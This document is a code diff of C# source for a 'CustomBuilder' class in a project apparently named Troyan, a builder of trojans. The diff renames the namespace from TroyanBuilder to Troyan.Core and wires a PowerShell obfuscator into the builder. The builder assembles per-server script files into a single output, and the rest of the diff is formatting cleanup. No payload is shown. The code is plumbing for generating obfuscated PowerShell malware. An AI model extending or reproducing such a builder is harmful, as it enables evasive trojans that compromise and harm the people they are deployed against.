@@ -5,16 +5,24 @@ using System.Text.Json.Nodes;
 using Commons;
 using model;
 
-namespace TroyanBuilder;
+namespace Troyan.Core;
 
 [SuppressMessage("ReSharper", "MemberCanBePrivate.Global")]
 public abstract partial class CustomBuilder
 {
-    protected CustomBuilder(TroyanBuildMode mode) => Mode = mode;
+    private readonly IPowerShellObfuscator _obfuscator;
+
+    protected CustomBuilder(TroyanBuildMode mode, IPowerShellObfuscator obfuscator)
+    {
+        Mode = mode;
+        _obfuscator = obfuscator;
+    }
 
     public TroyanBuildMode Mode { get; }
 
-    protected abstract string SourceDir {get;}
+    protected IPowerShellObfuscator Obfuscator => _obfuscator;
+
+    protected abstract string SourceDir { get; }
 
     protected abstract string OutputFile { get; }
 
@@ -25,16 +33,15 @@ public abstract partial class CustomBuilder
     private ServerService _serverService = null!;
     private ServerLayoutPaths _layout = null!;
 
-    /// <summary>Per-server and repo layout paths; set at the start of <see cref="Build"/>.</summary>
     protected ServerLayoutPaths L => _layout;
 
     protected ServerModel Model = new();
     protected PackItem? PackItem = null;
     private List<SourceFile> SourceFiles = new();
     private List<SourceFile> DoFiles => SourceFiles
-        .Where(a=> a.IsDo == true).ToList();
+        .Where(a => a.IsDo == true).ToList();
     private List<SourceFile> NonDoFiles => SourceFiles
-        .Where(a=> a.IsDo == false).ToList();
+        .Where(a => a.IsDo == false).ToList();
 
 
     private readonly StringBuilder Builder = new();
@@ -47,7 +54,7 @@ public abstract partial class CustomBuilder
         var srv = serverService.GetServerLite();
         Model = srv;
         if (!string.IsNullOrWhiteSpace(packId))
-            PackItem = Model.Pack.Items.FirstOrDefault(a=> a.Id == packId);
+            PackItem = Model.Pack.Items.FirstOrDefault(a => a.Id == packId);
         MakeConsts();
         InternalBuild(server);
         SourceFiles = GetSourceFiles();
@@ -68,7 +75,6 @@ public abstract partial class CustomBuilder
 
     protected virtual void PostBuild()
     {
-
     }
 
     private void MakeConsts()
@@ -108,7 +114,7 @@ _SERVER
         JsonNode FilterObjectByKeywords(JsonNode serverObject, List<string> filterKeywords)
         {
             var filteredDictionary = serverObject.AsObject()
-                .Where(kvp => !filterKeywords.Any(a=> kvp.Key.ToLower().ToLower().Contains(a.ToLower())))
+                .Where(kvp => !filterKeywords.Any(a => kvp.Key.ToLower().ToLower().Contains(a.ToLower())))
                 .ToDictionary(kvp => kvp.Key, kvp => kvp.Value);
 
             return JsonNode.Parse(JsonSerializer.Serialize(filteredDictionary))!;
@@ -125,7 +131,7 @@ _SERVER
 
     private void ComposeScript()
     {
-        foreach (var x in SourceFiles.Where(a=> a.Name == EntryPoint))
+        foreach (var x in SourceFiles.Where(a => a.Name == EntryPoint))
         {
             Builder.Append(x.Data);
             Builder.AppendLine();
@@ -151,7 +157,7 @@ _SERVER
         (var head, var body) = ExtractHeadAndBody(programRaw.Data);
         body = body.Replace("###doo", doo);
         dataProd = head + Environment.NewLine + dataProd + Environment.NewLine + body;
-        File.WriteAllText(OutputFile,dataProd);
+        File.WriteAllText(OutputFile, dataProd);
     }
 
     protected abstract void InternalBuild(string server);
@@ -198,7 +204,7 @@ _SERVER
                 }
             }
 
-            if ( !headBegin || (headBegin && !headEnd))
+            if (!headBegin || (headBegin && !headEnd))
             {
                 head.AppendLine(line);
             }
